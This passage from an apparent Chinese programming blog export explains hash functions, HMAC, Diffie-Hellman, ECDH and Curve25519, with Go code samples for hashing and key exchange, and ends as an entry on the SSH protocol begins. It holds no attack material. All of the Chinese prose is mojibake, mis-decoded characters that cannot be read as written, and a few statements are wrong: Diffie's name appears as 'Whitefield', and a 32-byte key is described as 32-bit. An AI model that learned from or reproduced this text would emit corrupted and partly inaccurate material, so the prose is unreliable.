·çš„è¾“å…¥æ•°æ®ä¹Ÿä¼šå¾—åˆ°ä¸åŒçš„ç­¾åï¼Œå› æ­¤ï¼Œå¯ä»¥æŠŠHmacç†è§£ä¸ºç”¨éšæœºæ•°â€œå¢žå¼ºâ€çš„å“ˆå¸Œç®—æ³•ã€‚ SHA-1ä¸ŽMD5çš„æ¯”è¾ƒå› ä¸ºäºŒè€…å‡ç”±MD4å¯¼å‡ºï¼ŒSHA-1å’ŒMD5å½¼æ­¤å¾ˆç›¸ä¼¼ã€‚ç›¸åº”çš„ï¼Œä»–ä»¬çš„å¼ºåº¦å’Œå…¶ä»–ç‰¹æ€§ä¹Ÿæ˜¯ç›¸ä¼¼ï¼Œä½†è¿˜æœ‰ä»¥ä¸‹å‡ ç‚¹ä¸åŒï¼š å¯¹å¼ºè¡Œä¾›ç»™çš„å®‰å…¨æ€§ï¼šæœ€æ˜¾è‘—å’Œæœ€é‡è¦çš„åŒºåˆ«æ˜¯SHA-1æ‘˜è¦æ¯”MD5æ‘˜è¦é•¿32 ä½ã€‚ä½¿ç”¨å¼ºè¡ŒæŠ€æœ¯ï¼Œäº§ç”Ÿä»»ä½•ä¸€ä¸ªæŠ¥æ–‡ä½¿å…¶æ‘˜è¦ç­‰äºŽç»™å®šæŠ¥æ‘˜è¦çš„éš¾åº¦å¯¹MD5æ˜¯2128æ•°é‡çº§çš„æ“ä½œï¼Œè€Œå¯¹SHA-1åˆ™æ˜¯2160æ•°é‡çº§çš„æ“ä½œã€‚è¿™æ ·ï¼ŒSHA-1å¯¹å¼ºè¡Œæ”»å‡»æœ‰æ›´å¤§çš„å¼ºåº¦ã€‚ å¯¹å¯†ç åˆ†æžçš„å®‰å…¨æ€§ï¼šç”±äºŽMD5çš„è®¾è®¡ï¼Œæ˜“å—å¯†ç åˆ†æžçš„æ”»å‡»ï¼ŒSHA-1æ˜¾å¾—ä¸æ˜“å—è¿™æ ·çš„æ”»å‡»ã€‚ é€Ÿåº¦ï¼šåœ¨ç›¸åŒçš„ç¡¬ä»¶ä¸Šï¼ŒSHA-1çš„è¿è¡Œé€Ÿåº¦æ¯”MD5æ…¢ã€‚ ä»£ç ç¤ºä¾‹ç”±äºŽMD5å·²ç»è¢«ç ´è§£äº†(ä¸­å›½å±±ä¸œå¤§å­¦çš„çŽ‹å°äº‘æ•™æŽˆç ´è§£), å¸¸ç”¨çš„æ•£åˆ—ç®—æ³•æ˜¯shaå®¶æ—, æ›´åŠ å®‰å…¨çš„ç®—æ³•æ˜¯ä½¿ç”¨Hmac123456789101112131415161718192021222324252627282930313233343536package mainimport ( "crypto/hmac" "crypto/sha1" "fmt" "io")// sha1æ•£åˆ—ç®—æ³•func sha1Hash(msg string) (hashData []byte) &#123; h := sha1.New() io.WriteString(h, msg) hashData = h.Sum(nil) return&#125;// ä½¿ç”¨sha1çš„Hmacæ•£åˆ—ç®—æ³•func hmacHash(msg string, key string) (hashData []byte) &#123; k := []byte(key) mac := hmac.New(sha1.New, k) io.WriteString(mac, msg) hashData = mac.Sum(nil) return&#125;func main() &#123; msg := "This is the message to hash!" // sha1 sha1Data := sha1Hash(msg) fmt.Printf("SHA1: %x\n", sha1Data) // hmac hmacData := hmacHash(msg, "The key string!") fmt.Printf("HMAC: %x\n", hmacData)&#125; ç§˜é’¥äº¤æ¢ç®—æ³•ä¸€ç§å¯†é’¥äº¤æ¢åè®®ï¼Œæ³¨æ„è¯¥ç®—æ³•åªèƒ½ç”¨äºŽå¯†é’¥çš„äº¤æ¢ï¼Œè€Œä¸èƒ½è¿›è¡Œæ¶ˆæ¯çš„åŠ å¯†å’Œè§£å¯†ã€‚åŒæ–¹ç¡®å®šè¦ç”¨çš„å¯†é’¥åŽï¼Œè¦ä½¿ç”¨å…¶ä»–å¯¹ç§°å¯†é’¥æ“ä½œåŠ å¯†ç®—æ³•å®žé™…åŠ å¯†å’Œè§£å¯†æ¶ˆæ¯ã€‚å®ƒå¯ä»¥è®©åŒæ–¹åœ¨ä¸æ³„æ¼å¯†é’¥çš„æƒ…å†µä¸‹åå•†å‡ºä¸€ä¸ªå¯†é’¥æ¥, å¸¸ç”¨äºŽä¿è¯å¯¹ç§°åŠ å¯†çš„ç§˜é’¥çš„å®‰å…¨, TLSå°±æ˜¯è¿™æ ·åšçš„ã€‚åœ¨è¿™ä¸ªé¢†åŸŸåº”è¯¥2ç§ DHï¼šECDHæ˜¯DHçš„åŠ å¼ºç‰ˆ ECDH: DHç®—æ³•çš„åŠ å¼ºç‰ˆ, å¸¸ç”¨çš„æ˜¯NISTç³»åˆ—,ä½†æ˜¯åŽé¢curve25519 curve25519: å®žè´¨ä¸Šä¹Ÿæ˜¯ä¸€ç§ECDH,ä½†æ˜¯å…¶å®žçŽ°æ›´ä¸ºä¼˜ç§€,è¡¨çŽ°çš„æ›´ä¸ºå®‰å…¨,å¯èƒ½æ˜¯ä¸‹ä¸€ä»£ç§˜é’¥äº¤æ¢ç®—æ³•çš„æ ‡å‡†ã€‚ DHDHå…¨ç§°æ˜¯:Diffie-Hellman, æ˜¯ä¸€ç§ç¡®ä¿å…±äº«KEYå®‰å…¨ç©¿è¶Šä¸å®‰å…¨ç½‘ç»œçš„æ–¹æ³•ï¼Œå®ƒæ˜¯OAKLEYçš„ä¸€ä¸ªç»„æˆéƒ¨åˆ†ã€‚Whitefieldä¸ŽMartin Hellmanåœ¨1976å¹´æå‡ºäº†ä¸€ä¸ªå¥‡å¦™çš„å¯†é’¥äº¤æ¢åè®®ï¼Œç§°ä¸ºDiffie-Hellmanå¯†é’¥äº¤æ¢åè®®/ç®—æ³•(Diffie-Hellman Key Exchange/Agreement Algorithm).è¿™ä¸ªæœºåˆ¶çš„å·§å¦™åœ¨äºŽéœ€è¦å®‰å…¨é€šä¿¡çš„åŒæ–¹å¯ä»¥ç”¨è¿™ä¸ªæ–¹æ³•ç¡®å®šå¯¹ç§°å¯†é’¥ã€‚ç„¶åŽå¯ä»¥ç”¨è¿™ä¸ªå¯†é’¥è¿›è¡ŒåŠ å¯†å’Œè§£å¯†ã€‚DHä¾èµ–äºŽè®¡ç®—ç¦»æ•£å¯¹æ•°çš„éš¾åº¦, å¤§æ¦‚è¿‡ç¨‹å¦‚ä¸‹: å¯ä»¥å¦‚ä¸‹å®šä¹‰ç¦»æ•£å¯¹æ•°ï¼šé¦–å…ˆå®šä¹‰ä¸€ä¸ªç´ æ•°pçš„åŽŸæ ¹ï¼Œä¸ºå…¶å„æ¬¡å¹‚äº§ç”Ÿä»Ž1 åˆ°p-1çš„æ‰€æœ‰æ•´æ•°æ ¹ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æžœaæ˜¯ç´ æ•°pçš„ä¸€ä¸ªåŽŸæ ¹ï¼Œé‚£ä¹ˆæ•°å€¼ a mod p,a2 mod p,â€¦,ap-1 mod p æ˜¯å„ä¸ç›¸åŒçš„æ•´æ•°ï¼Œå¹¶ä¸”ä»¥æŸç§æŽ’åˆ—æ–¹å¼ç»„æˆäº†ä»Ž1åˆ°p-1çš„æ‰€æœ‰æ•´æ•°. å¯¹äºŽä¸€ä¸ªæ•´æ•°bå’Œç´ æ•°pçš„ä¸€ä¸ªåŽŸæ ¹aï¼Œå¯ä»¥æ‰¾åˆ°æƒŸä¸€çš„æŒ‡æ•°iï¼Œä½¿å¾— b = a^i mod p å…¶ä¸­0 â‰¤ i â‰¤ ï¼ˆp-1ï¼‰ æŒ‡æ•°iç§°ä¸ºbçš„ä»¥aä¸ºåŸºæ•°çš„æ¨¡pçš„ç¦»æ•£å¯¹æ•°æˆ–è€…æŒ‡æ•°.è¯¥å€¼è¢«è®°ä¸ºinda,p(b). ECDHå…¨ç§°æ˜¯Elliptic Curve Diffie-Hellman, æ˜¯DHç®—æ³•çš„åŠ å¼ºç‰ˆ, åŸºäºŽæ¤­åœ†æ›²çº¿éš¾é¢˜åŠ å¯†, çŽ°åœ¨æ˜¯ä¸»æµçš„å¯†é’¥äº¤æ¢ç®—æ³•ã€‚ECCæ˜¯å»ºç«‹åœ¨åŸºäºŽæ¤­åœ†æ›²çº¿çš„ç¦»æ•£å¯¹æ•°çš„éš¾åº¦, å¤§æ¦‚è¿‡ç¨‹å¦‚ä¸‹: ç»™å®šæ¤­åœ†æ›²çº¿ä¸Šçš„ä¸€ä¸ªç‚¹Pï¼Œä¸€ä¸ªæ•´æ•°kï¼Œæ±‚è§£Q=kPå¾ˆå®¹æ˜“ï¼›ç»™å®šä¸€ä¸ªç‚¹Pã€Qï¼ŒçŸ¥é“Q=kPï¼Œæ±‚æ•´æ•°kç¡®æ˜¯ä¸€ä¸ªéš¾é¢˜ã€‚ECDHå³å»ºç«‹åœ¨æ­¤æ•°å­¦éš¾é¢˜ä¹‹ä¸Š æ¤­åœ†æ›²çº¿ç®—æ³•å› å‚æ•°ä¸åŒæœ‰å¤šç§ç±»åž‹, è¿™ä¸ªç½‘ç«™åˆ—å‡ºäº†çŽ°é˜¶æ®µé‚£äº›ECCæ˜¯ç›¸å¯¹å®‰å…¨çš„:æ¤­åœ†æ›²çº¿ç®—æ³•å®‰å…¨åˆ—è¡¨, è€Œcurve25519ä¾¿æ˜¯å…¶ä¸­çš„ä½¼ä½¼è€…ã€‚Curve25519/Ed25519/X25519æ˜¯è‘—åå¯†ç å­¦å®¶Daniel J. Bernsteinåœ¨2006å¹´ç‹¬ç«‹è®¾è®¡çš„æ¤­åœ†æ›²çº¿åŠ å¯†/ç­¾å/å¯†é’¥äº¤æ¢ç®—æ³•, å’ŒçŽ°æœ‰çš„ä»»ä½•æ¤­åœ†æ›²çº¿ç®—æ³•éƒ½å®Œå…¨ç‹¬ç«‹ã€‚ç‰¹ç‚¹æ˜¯ï¼š å®Œå…¨å¼€æ”¾è®¾è®¡: ç®—æ³•å„å‚æ•°çš„é€‰æ‹©ç›´æˆªäº†å½“ï¼Œéžå¸¸æ˜Žç¡®ï¼Œæ²¡æœ‰ä»»ä½•å¯ç–‘ä¹‹å¤„ï¼Œç›¸æ¯”ä¹‹ä¸‹ç›®å‰å¹¿æ³›ä½¿ç”¨çš„æ¤­åœ†æ›²çº¿æ˜¯NISTç³»åˆ—æ ‡å‡†ï¼Œæ–¹ç¨‹çš„ç³»æ•°æ˜¯ä½¿ç”¨æ¥åŽ†ä¸æ˜Žçš„éšæœºç§å­ c49d3608 86e70493 6a6678e1 139d26b7 819f7e90 ç”Ÿæˆçš„ï¼Œéžå¸¸å¯ç–‘ï¼Œç–‘ä¼¼åŽé—¨ï¼› é«˜å®‰å…¨æ€§ï¼š ä¸€ä¸ªæ¤­åœ†æ›²çº¿åŠ å¯†ç®—æ³•å°±ç®—åœ¨æ•°å­¦ä¸Šæ˜¯å®‰å…¨çš„ï¼Œåœ¨å®žç”¨ä¸Šä¹Ÿå¹¶ä¸ä¸€å®šå®‰å…¨ï¼Œæœ‰å¾ˆå¤§çš„æ¦‚çŽ‡é€šè¿‡ç¼“å­˜ã€æ—¶é—´ã€æ¶æ„è¾“å…¥æ‘§æ¯å®‰å…¨æ€§ï¼Œè€Œ25519ç³»åˆ—æ¤­åœ†æ›²çº¿ç»è¿‡ç‰¹åˆ«è®¾è®¡ï¼Œå°½å¯èƒ½çš„å°†å‡ºé”™çš„æ¦‚çŽ‡é™åˆ°äº†æœ€ä½Žï¼Œå¯ä»¥è¯´æ˜¯å®žè·µä¸Šæœ€å®‰å…¨çš„åŠ å¯†ç®—æ³•ã€‚ä¾‹å¦‚ï¼Œä»»ä½•ä¸€ä¸ª32ä½éšæœºæ•°éƒ½æ˜¯ä¸€ä¸ªåˆæ³•çš„X25519å…¬é’¥ï¼Œå› æ­¤é€šè¿‡æ¶æ„æ•°å€¼æ”»å‡»æ˜¯ä¸å¯èƒ½çš„ï¼Œç®—æ³•åœ¨è®¾è®¡çš„æ—¶å€™åˆ»æ„é¿å…çš„æŸäº›åˆ†æ”¯æ“ä½œï¼Œè¿™æ ·åœ¨ç¼–ç¨‹çš„æ—¶å€™å¯ä»¥ä¸ä½¿ç”¨if ï¼Œå‡å°‘äº†ä¸åŒifåˆ†æ”¯ä»£ç æ‰§è¡Œæ—¶é—´ä¸åŒçš„æ—¶åºæ”»å‡»æ¦‚çŽ‡ï¼Œç›¸åï¼Œ NISTç³»åˆ—æ¤­åœ†æ›²çº¿ç®—æ³•åœ¨å®žé™…åº”ç”¨ä¸­å‡ºé”™çš„å¯èƒ½æ€§éžå¸¸å¤§ï¼Œè€Œä¸”å¯¹äºŽæŸäº›ç†è®ºæ”»å‡»çš„å…ç–«èƒ½åŠ›ä¸é«˜ï¼Œ Bernstein å¯¹å¸‚é¢ä¸Šæ‰€æœ‰çš„åŠ å¯†ç®—æ³•ä½¿ç”¨12ä¸ªæ ‡å‡†è¿›è¡Œäº†è€ƒå¯Ÿï¼Œ 25519æ˜¯å‡ ä¹Žå”¯ä¸€æ»¡è¶³è¿™äº›æ ‡å‡†çš„ http://t.cn/RMGmi1g ï¼› é€Ÿåº¦å¿«: 25519ç³»åˆ—æ›²çº¿æ˜¯ç›®å‰æœ€å¿«çš„æ¤­åœ†æ›²çº¿åŠ å¯†ç®—æ³•ï¼Œæ€§èƒ½è¿œè¿œè¶…è¿‡NISTç³»åˆ—ï¼Œè€Œä¸”å…·æœ‰æ¯”P-256æ›´é«˜çš„å®‰å…¨æ€§ï¼› ä½œè€…åŠŸåº•æ·±åŽš: Daniel J. Bernsteinæ˜¯ä¸–ç•Œè‘—åçš„å¯†ç å­¦å®¶ï¼Œä»–åœ¨å¤§å­¦æ›¾ç»å¼€è®¾è¿‡ä¸€é—¨ UNIX ç³»ç»Ÿå®‰å…¨çš„è¯¾ç¨‹ç»™å­¦ç”Ÿï¼Œç»“æžœä¸€å­¦æœŸä¸‹æ¥ï¼Œå‘çŽ°äº† UNIX ç¨‹åºä¸­çš„ 91 ä¸ªå®‰å…¨æ¼æ´žï¼›ä»–æ—©å¹´åœ¨ç¾Žå›½ä¾ç„¶ç¦æ­¢å‡ºå£åŠ å¯†ç®—æ³•æ—¶ï¼Œæ›¾å› ä¸ºæŠŠè‡ªå·±è®¾è®¡çš„åŠ å¯†ç®—æ³•å‘å¸ƒåˆ°ç½‘ä¸Šé­åˆ°äº†ç¾Žå›½æ”¿åºœçš„èµ·è¯‰ï¼Œä»–æœ¬äººæŠ—äº‰å…­å¹´ï¼Œæœ€åŽç¾Žå›½æ”¿åºœæ’¤é”€æ‰€æœ‰æŒ‡æŽ§ï¼Œç›®å‰å¦ä¸€ä¸ªéžå¸¸ç«çš„é«˜æ€§èƒ½å®‰å…¨æµå¯†ç  ChaCha20 ä¹Ÿæ˜¯å‡ºè‡ª Bernstein ä¹‹æ‰‹ï¼› ä¸‹ä¸€ä»£çš„æ ‡å‡†: 25519ç³»åˆ—æ›²çº¿è‡ª2006å¹´å‘è¡¨ä»¥æ¥ï¼Œé™¤äº†å­¦æœ¯ç•Œæ— äººé—®æ´¥ï¼Œ 2013 å¹´çˆ±å¾·åŽÂ·æ–¯è¯ºç™»æ›å…‰æ£±é•œè®¡åˆ’åŽï¼Œè¯¥ç®—æ³•çªç„¶å¤§ç«ï¼Œå¤§é‡è½¯ä»¶ï¼Œå¦‚OpenSSHéƒ½è¿…é€Ÿå¢žåŠ äº†å¯¹25519ç³»åˆ—çš„æ”¯æŒï¼Œå¦‚ä»Š25519å·²ç»æ˜¯å¤§åŠ¿æ‰€è¶‹ï¼Œå¯ç–‘çš„NISTæ›²çº¿è¿Ÿæ—©è¦é€€å‡ºæ¤­åœ†æ›²çº¿çš„åŽ†å²èˆžå°ï¼Œç›®å‰ï¼Œ RFCå¢žåŠ äº†SSL/TLSå¯¹X25519å¯†é’¥äº¤æ¢åè®®çš„æ”¯æŒï¼Œè€Œæ–°ç‰ˆ OpenSSL 1.1ä¹ŸåŠ å…¥æ”¯æŒï¼Œæ˜¯æ‘†è„±è€å¤§å“¥çš„ç¬¬ä¸€æ­¥ï¼Œä¸‹ä¸€æ­¥æ˜¯å°† Ed25519åšä¸ºå¯é€‰çš„TLSè¯ä¹¦ç­¾åç®—æ³•ï¼Œå½»åº•æ‘†è„±NIST ä»£ç ç¤ºä¾‹è¿™é‡Œéœ€è¦æŒ‡å‡ºä¸‹golangçš„æ ‡å‡†åº“çš„cryptoé‡Œçš„æ¤­åœ†æ›²çº¿å®žçŽ°äº†è¿™4ç§(ellipticæ–‡æ¡£): P224/P256/P384/P521, è€Œcurve25519æ˜¯å•ç‹¬å®žçŽ°çš„, ä»–ä¸åœ¨æ ‡å‡†åº“ä¸­: golang.org/x/crypto/curve25519123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212package mainimport ( "crypto" "crypto/elliptic" "crypto/rand" "fmt" "io" "math/big" "golang.org/x/crypto/curve25519")// ECDH ç§˜é’¥äº¤æ¢ç®—æ³•çš„ä¸»æŽ¥å£type ECDH interface &#123; GenerateKey(io.Reader) (crypto.PrivateKey, crypto.PublicKey, error) Marshal(crypto.PublicKey) []byte Unmarshal([]byte) (crypto.PublicKey, bool) GenerateSharedSecret(crypto.PrivateKey, crypto.PublicKey) ([]byte, error)&#125;type ellipticECDH struct &#123; ECDH curve elliptic.Curve&#125;type ellipticPublicKey struct &#123; elliptic.Curve X, Y *big.Int&#125;type ellipticPrivateKey struct &#123; D []byte&#125;// NewEllipticECDH æŒ‡å®šä¸€ç§æ¤­åœ†æ›²çº¿ç®—æ³•ç”¨äºŽåˆ›å»ºä¸€ä¸ªECDHçš„å®žä¾‹// å…³äºŽæ¤­åœ†æ›²çº¿ç®—æ³•æ ‡å‡†åº“é‡Œé¢å®žçŽ°äº†4ç§: è§crypto/ellipticfunc NewEllipticECDH(curve elliptic.Curve) ECDH &#123; return &amp;ellipticECDH&#123; curve: curve, &#125;&#125;// GenerateKey åŸºäºŽæ ‡å‡†åº“çš„NISTæ¤­åœ†æ›²çº¿ç®—æ³•ç”Ÿæˆç§˜é’¥å¯¹func (e *ellipticECDH) GenerateKey(rand io.Reader) (crypto.PrivateKey, crypto.PublicKey, error) &#123; var d []byte var x, y *big.Int var priv *ellipticPrivateKey var pub *ellipticPublicKey var err error d, x, y, err = elliptic.GenerateKey(e.curve, rand) if err != nil &#123; return nil, nil, err &#125; priv = &amp;ellipticPrivateKey&#123; D: d, &#125; pub = &amp;ellipticPublicKey&#123; Curve: e.curve, X: x, Y: y, &#125; return priv, pub, nil&#125;// Marshalç”¨äºŽå…¬é’¥çš„åºåˆ—åŒ–func (e *ellipticECDH) Marshal(p crypto.PublicKey) []byte &#123; pub := p.(*ellipticPublicKey) return elliptic.Marshal(e.curve, pub.X, pub.Y)&#125;// Unmarshalç”¨äºŽå…¬é’¥çš„ååºåˆ—åŒ–func (e *ellipticECDH) Unmarshal(data []byte) (crypto.PublicKey, bool) &#123; var key *ellipticPublicKey var x, y *big.Int x, y = elliptic.Unmarshal(e.curve, data) if x == nil || y == nil &#123; return key, false &#125; key = &amp;ellipticPublicKey&#123; Curve: e.curve, X: x, Y: y, &#125; return key, true&#125;// GenerateSharedSecret é€šè¿‡è‡ªå·±çš„ç§é’¥å’Œå¯¹æ–¹çš„å…¬é’¥åå•†ä¸€ä¸ªå…±äº«å¯†ç func (e *ellipticECDH) GenerateSharedSecret(privKey crypto.PrivateKey, pubKey crypto.PublicKey) ([]byte, error) &#123; priv := privKey.(*ellipticPrivateKey) pub := pubKey.(*ellipticPublicKey) x, _ := e.curve.ScalarMult(pub.X, pub.Y, priv.D) return x.Bytes(), nil&#125;// NewCurve25519ECDH ä½¿ç”¨å¯†ç å­¦å®¶Daniel J. Bernsteinçš„æ¤­åœ†æ›²çº¿ç®—æ³•:Curve25519æ¥åˆ›å»ºECDHå®žä¾‹// å› ä¸ºCurve25519ç‹¬ç«‹äºŽNISTä¹‹å¤–, æ²¡åœ¨æ ‡å‡†åº“å®žçŽ°, éœ€è¦å•ç‹¬ä¸ºæœŸå®žçŽ°ä¸€å¥—æŽ¥å£æ¥æ”¯æŒECDHfunc NewCurve25519ECDH() ECDH &#123; return &amp;curve25519ECDH&#123;&#125;&#125;type curve25519ECDH struct &#123; ECDH&#125;// GenerateKey åŸºäºŽcurve25519æ¤­åœ†æ›²çº¿ç®—æ³•ç”Ÿæˆç§˜é’¥å¯¹func (e *curve25519ECDH) GenerateKey(rand io.Reader) (crypto.PrivateKey, crypto.PublicKey, error) &#123; var pub, priv [32]byte var err error _, err = io.ReadFull(rand, priv[:]) if err != nil &#123; return nil, nil, err &#125; priv[0] &amp;= 248 priv[31] &amp;= 127 priv[31] |= 64 curve25519.ScalarBaseMult(&amp;pub, &amp;priv) return &amp;priv, &amp;pub, nil&#125;// å®žçŽ°å…¬é’¥çš„åºåˆ—åŒ–func (e *curve25519ECDH) Marshal(p crypto.PublicKey) []byte &#123; pub := p.(*[32]byte) return pub[:]&#125;// å®žçŽ°å…¬é’¥çš„ååºåˆ—åŒ–func (e *curve25519ECDH) Unmarshal(data []byte) (crypto.PublicKey, bool) &#123; var pub [32]byte if len(data) != 32 &#123; return nil, false &#125; copy(pub[:], data) return &amp;pub, true&#125;// å®žçŽ°ç§˜é’¥åå•†æŽ¥å£func (e *curve25519ECDH) GenerateSharedSecret(privKey crypto.PrivateKey, pubKey crypto.PublicKey) ([]byte, error) &#123; var priv, pub, secret *[32]byte priv = privKey.(*[32]byte) pub = pubKey.(*[32]byte) secret = new([32]byte) curve25519.ScalarMult(secret, priv, pub) return secret[:], nil&#125;func test(e ECDH) &#123; var privKey1, privKey2 crypto.PrivateKey var pubKey1, pubKey2 crypto.PublicKey var pubKey1Buf, pubKey2Buf []byte var err error var ok bool var secret1, secret2 []byte // å‡†å¤‡2å¯¹ç§˜é’¥å¯¹,A: privKey1,pubKey1 B:privKey2,pubKey2 privKey1, pubKey1, err = e.GenerateKey(rand.Reader) if err != nil &#123; fmt.Println(err) &#125; privKey2, pubKey2, err = e.GenerateKey(rand.Reader) if err != nil &#123; fmt.Println(err) &#125; pubKey1Buf = e.Marshal(pubKey1) pubKey2Buf = e.Marshal(pubKey2) pubKey1, ok = e.Unmarshal(pubKey1Buf) if !ok &#123; fmt.Println("Unmarshal does not work") &#125; pubKey2, ok = e.Unmarshal(pubKey2Buf) if !ok &#123; fmt.Println("Unmarshal does not work") &#125; // A é€šè¿‡Bç»™çš„å…¬é’¥åå•†å…±äº«å¯†ç  secret1, err = e.GenerateSharedSecret(privKey1, pubKey2) if err != nil &#123; fmt.Println(err) &#125; // B é€šè¿‡Aç»™çš„å…¬é’¥åå•†å…±äº«å¯†ç  secret2, err = e.GenerateSharedSecret(privKey2, pubKey1) if err != nil &#123; fmt.Println(err) &#125; // A Båœ¨æ²¡æš´éœ²ç›´æŽ¥çš„ç§é’¥çš„æƒ…å†µä¸‹, åå•†å‡ºäº†ä¸€ä¸ªå…±äº«å¯†ç  fmt.Printf("The secret1 shared keys: %x\n", secret1) fmt.Printf("The secret2 shared keys: %x\n", secret2)&#125;func main() &#123; e1 := NewEllipticECDH(elliptic.P521()) e2 := NewCurve25519ECDH() test(e1) test(e2)&#125; æ€»ä½“ç»“è®ºä»¥ä¸Šç»¼è¿°äº†ä¸¤ç§åŠ å¯†æ–¹æ³•çš„åŽŸç†ï¼Œæ€»ä½“æ¥è¯´ä¸»è¦æœ‰ä¸‹é¢å‡ ä¸ªæ–¹é¢çš„ä¸åŒï¼š ç®¡ç†æ–¹é¢ï¼šå…¬é’¥å¯†ç ç®—æ³•åªéœ€è¦è¾ƒå°‘çš„èµ„æºå°±å¯ä»¥å®žçŽ°ç›®çš„ï¼Œåœ¨å¯†é’¥çš„åˆ†é…ä¸Šï¼Œä¸¤è€…ä¹‹é—´ç›¸å·®ä¸€ä¸ªæŒ‡æ•°çº§åˆ«ï¼ˆä¸€ä¸ªæ˜¯nä¸€ä¸ªæ˜¯n2ï¼‰ã€‚æ‰€ä»¥ç§é’¥å¯†ç ç®—æ³•ä¸é€‚åº”å¹¿åŸŸç½‘çš„ä½¿ç”¨ï¼Œè€Œä¸”æ›´é‡è¦çš„ä¸€ç‚¹æ˜¯å®ƒä¸æ”¯æŒæ•°å­—ç­¾åã€‚ å®‰å…¨æ–¹é¢ï¼šç”±äºŽå…¬é’¥å¯†ç ç®—æ³•åŸºäºŽæœªè§£å†³çš„æ•°å­¦éš¾é¢˜ï¼Œåœ¨ç ´è§£ä¸Šå‡ ä¹Žä¸å¯èƒ½ã€‚å¯¹äºŽç§é’¥å¯†ç ç®—æ³•ï¼Œåˆ°äº†AESè™½è¯´ä»Žç†è®ºæ¥è¯´æ˜¯ä¸å¯èƒ½ç ´è§£çš„ï¼Œä½†ä»Žè®¡ç®—æœºçš„å‘å±•è§’åº¦æ¥çœ‹ã€‚å…¬é’¥æ›´å…·æœ‰ä¼˜è¶Šæ€§ã€‚ é€Ÿåº¦ä¸Šæ¥çœ‹ï¼šAESçš„è½¯ä»¶å®žçŽ°é€Ÿåº¦å·²ç»è¾¾åˆ°äº†æ¯ç§’æ•°å…†æˆ–æ•°åå…†æ¯”ç‰¹ã€‚æ˜¯å…¬é’¥çš„100å€ï¼Œå¦‚æžœç”¨ç¡¬ä»¶æ¥å®žçŽ°çš„è¯è¿™ä¸ªæ¯”å€¼å°†æ‰©å¤§åˆ°1000å€ã€‚]]></content>
      <categories>
        <category>å¼€å‘è¯­è¨€</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>crypto</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[è·³æ¿æœºç³»åˆ—(äºŒ)-sshåè®®åŽŸç†ç®€ä»‹]]></title>
    <url>%2F2017%2F02%2F16%2Fssh-protocol%2F</url>
    <content type="text"><![CDATA[SSHå¯¹äºŽå¤§å¤šæ•°äººæ¥è¯´åº”è¯¥å¹¶ä¸é™Œç”Ÿ, æ— è®ºä½ æ˜¯å¼€å‘è¿˜æ˜¯æµ‹è¯•è¿˜æ˜¯è¿ç»´, åªè¦ä½ éœ€è¦ç™»å½•ç±»UnixæœåŠ¡å™¨éƒ½ä¼šç”¨åˆ°, ä»–è¢«ç”¨æ¥æä¾›é“¾æŽ¥çš„å®‰å…¨ä¿éšœ, æ¯”å¦‚å¸¸è§çš„å®¢æˆ·ç«¯æœ‰å‘½ä»¤è¡Œå·¥å…·ssh, ä»¥åŠå‘¨è¾¹çš„å•†ä¸šå·¥å…·Xshellç­‰ã€‚åœ¨è¿™ç¯‡æ–‡ç« é‡Œæˆ‘ä»¬ä¸ä¼šæ•™ä½ å¦‚ä½•ä½¿ç”¨xshell, è€Œæ˜¯ä»Žåè®®å±‚é¢å…¨æ–°çš„è®¤è¯†ä¸‹sshã€‚ èƒŒæ™¯è™½ç„¶SSHä½¿ç”¨èµ·æ¥å¾ˆç®€å•, ä½†æ˜¯èƒŒåŽçš„åŽŸç†ç‰¹åˆ«ä¸ç®€å•,å…³äºŽä»¥ä¸‹é—®é¢˜, ä½ èƒ½å¦çŸ¥æ™“å…¶ç»†èŠ‚: SSHå¦‚ä½•ä¿è¯å®¢æˆ·ç«¯ä¸ŽæœåŠ¡ç«¯é€šè¡Œçš„å®‰å…¨ SSHé‡‡ç”¨ä»€ä¹ˆåŠ å¯†åè®® SSHæ˜¯é€šè¿‡å¯¹ç§°åŠ å¯†è¿˜æ˜¯éžå¯¹ç§°åŠ å¯†æ•°æ®åœ¨ä¼ è¾“è¿‡ç¨‹çš„å®‰å…¨ SSHå¦‚ä½•ä¿è¯æ•°æ®å®Œæ•´æ€§ SSHçš„å¯†ç è®¤è¯æ–¹å¼å’Œå¯†é’¥è®¤è¯æ–¹å¼åˆ†åˆ«å¦‚ä½•å®žçŽ°ï¼Œæœ‰ä½•å·®å¼‚ ç®€ä»‹SSHå…¨ç§°Secure Shellæ˜¯ä¸€ç§å·¥ä½œåœ¨åº”ç”¨å±‚å’Œä¼ è¾“å±‚ä¸Šçš„å®‰å…¨åè®®ï¼Œèƒ½åœ¨éžå®‰å…¨é€šé“ä¸Šå»ºç«‹å®‰å…¨é€šé“ã€‚æä¾›èº«ä»½è®¤è¯ã€å¯†é’¥æ›´æ–°ã€æ•°æ®æ ¡éªŒã€é€šé“å¤ç”¨ç­‰åŠŸèƒ½ï¼ŒåŒæ—¶å…·æœ‰è‰¯å¥½çš„å¯æ‰©å±•æ€§,ç”±èŠ¬å…°èµ«å°”è¾›åŸºå¤§å­¦ç ”ç©¶å‘˜Tatu YlÃ¶nen,äºŽ1995å¹´æå‡ºï¼Œå…¶ç›®çš„æ˜¯ç”¨äºŽæ›¿ä»£éžå®‰å…¨çš„Telnetã€rshã€rexecç­‰è¿œç¨‹Shellåè®®ã€‚ä¹‹åŽSSHå‘å±•äº†ä¸¤ä¸ªå¤§ç‰ˆæœ¬,SSH-1å’ŒSSH-2, å¼€æºå®žçŽ°OpenSSHå¯¹2è€…éƒ½æ”¯æŒã€‚SSHçš„ä¸»è¦ç‰¹æ€§: åŠ å¯†: é¿å…æ•°æ®å†…å®¹æ³„æ¼ é€šä¿¡çš„å®Œæ•´æ€§: é¿å…æ•°æ®è¢«ç¯¡æ”¹ï¼Œä»¥åŠå‘é€æˆ–æŽ¥å—åœ°å€ä¼ªè£…(æ£€æŸ¥æ•°æ®æ˜¯å¦è¢«ç¯¡æ”¹ï¼Œæ•°æ®æ˜¯å¦æ¥è‡ªå‘é€è€…è€Œéžæ”»å‡»è€…ï¼‰ 